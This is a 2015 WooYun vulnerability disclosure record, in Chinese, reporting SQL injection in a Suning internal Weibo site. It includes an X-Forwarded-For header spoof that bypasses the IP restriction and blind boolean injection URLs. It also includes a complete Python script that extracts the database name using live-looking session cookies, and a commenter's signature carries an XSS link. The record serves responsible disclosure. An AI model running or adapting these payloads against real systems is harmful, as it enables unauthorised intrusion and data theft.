{"id": 5580, "wybug_id": "wooyun-2015-0123916", "wybug_title": "苏宁内部系统SQL注入(附利用方法和验证脚本)", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "Coody", "wybug_date": "2015-07-01 16:23", "wybug_open_date": "2015-08-15 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向公众公开  简要描述： 说好的礼品卡呢？ 详细说明：  漏洞站点：http://weibo.cnsuning.com/ (苏宁：不是所有的微博都叫苏宁微博)0x01:绕过ip地址限制直接访问该地址，提示“您当前的IP在不是苏宁电器总部的IP，无法访问前台。”\n\n额，目测是验证客户端的来源ip，直接使用 X-Forwarded-For 插件就可绕过验证\n\n设置好后，直接访问目标地址\n\n嗯哼，直接打开了。0x02：获取内部帐号 通过收集信息，直接登录一个内部帐号（此处略~~~）0x03:SQL注入漏洞通过测试，发现该系统存在SQL注入漏洞问题链接为：http://weibo.cnsuning.com/ajax.php?mod=member&code=sel&type=top&province=1&hid_city=其中参数 province  存在注入，判断数据库名的长度，http://weibo.cnsuning.com/ajax.php?mod=member&code=sel&type=top&province=1/**/and/**/length(database())=5&hid_city=当 length 的长度等于5时返回正常\n\n修改语句直接跑取数据库名\n/ajax.php?mod=member&code=sel&type=top&province=1/**/and/**/ascii(substr(database(),N,1))=M&hid_city=其中 N 代表第几位字符 ，M 代表字母 ascii 码\n当前数据库名称为“weibo”\n\n   漏洞证明：  附上利用脚本：\n#encoding=utf-8 import httplib import time import string import sys import random import urllib headers = {'Content-Type': 'application/x-www-form-urlencoded',       'X-Requested-With': 'XMLHttpRequest',       'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',       'Cookie':' _wbma=weibo.cnsuning.com%7C14353112666246444095519302%7C1435311266624%7C1435736372201%7C1435736405085%7C81%7C3; _wbmc=weibo.cnsuning.com; _wbmb=14357360303501756793251744%7C%7C%7C22;jishigou_YnQbd2_auth=b894Q1QF2ymXvAaat%2BBJ0dwP0InpJNhi3zGtCB30mGyR2Q4BH7uk%2Bf%2F%2FQKxTY%2Bysci6B4luF2L1gMgNn6on8SHIcKw; jishigou_YnQbd2_login_credits=1435736257; jishigou_YnQbd2_sid=DPZcJd',      'X-Forwarded-For':'192.168.121.194'} payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.' print 'start to retrive Current database name :' user = '' for i in range(1,6):     for payload in payloads:         conn = httplib.HTTPConnection('weibo.cnsuning.com', timeout=120)         conn.request(method='GET',                      url='/ajax.php?mod=member&code=sel&type=top&province=1/**/and/**/ascii(substr(database(),%s,1))=%s' % (i,ord(payload)),         headers=headers)         resp = conn.getresponse()         html_doc = resp.read()         conn.close()         #print html_doc         print '.',         if html_doc.find('value=41') > 0:  # True             #print bb             user += payload             print '\\n[in progress]', user             break print '\\nCurrent Database name is', user\n   修复方案：     版权声明：转载请注明来源 Coody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-01 16:39 厂商回复： 感谢提交，此系统非苏宁易购网站。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-01 17:00 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  附验证脚本，屌屌的啊！！    \n     2015-07-01 17:01 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @PgHook cnsuning.com  竟然说“此系统非苏宁易购网站”    \n     2015-07-01 17:09 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @Coody 官方原则上只接受suning.com  域下的安全问题    \n     2015-07-01 17:16 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @zzR 额，我一直认为内部的系统都在走cnsuning这个玉米呢    \n     2015-07-01 17:38 |    \t\tzds426 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 住在北京)\t\t \n  看看    \n     2015-07-01 20:45 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  我的购物卡是不是寄 你们那里去了？    \n     2015-07-01 22:12 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @专业种田 苏宁的稍后→_→→_→→_→    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}